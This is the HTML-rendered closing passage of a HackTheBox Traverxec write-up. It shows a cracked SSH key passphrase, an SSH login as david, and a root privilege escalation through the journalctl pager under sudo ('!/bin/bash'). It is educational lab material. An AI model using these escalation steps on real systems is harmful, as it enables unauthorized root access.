</span></span><span class=line><span class=cl><span class=mi>1</span><span class=n>g</span> <span class=mi>0</span><span class=p>:</span><span class=mi>00</span><span class=p>:</span><span class=mi>00</span><span class=p>:</span><span class=mi>07</span> <span class=n>DONE</span> <span class=p>(</span><span class=mi>2020</span><span class=o>-</span><span class=mi>03</span><span class=o>-</span><span class=mi>12</span> <span class=mi>17</span><span class=p>:</span><span class=mi>38</span><span class=p>)</span> <span class=mf>0.1396</span><span class=n>g</span><span class=o>/</span><span class=n>s</span> <span class=mi>2003</span><span class=n>Kp</span><span class=o>/</span><span class=n>s</span> <span class=mi>2003</span><span class=n>Kc</span><span class=o>/</span><span class=n>s</span> <span class=mi>2003</span><span class=n>KC</span><span class=o>/</span><span class=n>s</span> <span class=o>*</span><span class=mi>7</span><span class=err>┬í</span><span class=n>Vamos</span><span class=o>!</span>
</span></span><span class=line><span class=cl><span class=n>Session</span> <span class=n>completed</span>
</span></span></code></pre></td></tr></table></div></div><p>We can finally connect via SSH as david:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ssh david@10.10.10.165 -i home/david/.ssh/id_rsa
</span></span><span class=line><span class=cl>Enter passphrase for key &#39;home/david/.ssh/id_rsa&#39;: 
</span></span><span class=line><span class=cl>Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
</span></span><span class=line><span class=cl>Last login: Thu Mar 12 12:27:40 2020 from 10.10.15.152
</span></span><span class=line><span class=cl>david@traverxec:~$ 
</span></span></code></pre></td></tr></table></div></div><h3 id=privilege-escalation-of-machine--david-to-root>Privilege Escalation of Machine : david to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--david-to-root>#</a></h3><p><strong>TL;DR</strong>: <code>journalctl</code> pe</p><p>In david home directory there is a folder named <code>bin</code> containing:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>david@traverxec:~$ ls bin
</span></span><span class=line><span class=cl>server-stats.head  server-stats.sh
</span></span></code></pre></td></tr></table></div></div><p>The <code>server-stats.sh</code> is our way to root:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>cat /home/david/bin/server-stats.head
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Load: `/usr/bin/uptime`&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34; &#34;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34; &#34;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Last 5 journal log lines:&#34;</span>
</span></span><span class=line><span class=cl>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service <span class=p>|</span> /usr/bin/cat 
</span></span></code></pre></td></tr></table></div></div><p>It seems we can execute <code>journalctl</code> as root so let&rsquo;s check on
<a href=https://gtfobins.github.io/>GTFOBins</a> if there is a way to upgrade our privileges.</p><p>Of course <a href=https://gtfobins.github.io/gtfobins/journalctl/#sudo>there is</a>!</p><p>Like with <code>git</code>, <code>journalctl</code> will use a pager when the output is too large.</p><p>But to trigger the pager, we need to resize our terminal to be smaller than
the text output.</p><p>The we execute <code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code> and
in the pager we just have to write <code>!/bin/bash</code> to get a shell as root.</p><p>That&rsquo;s it we are root.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/easy/>Easy</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>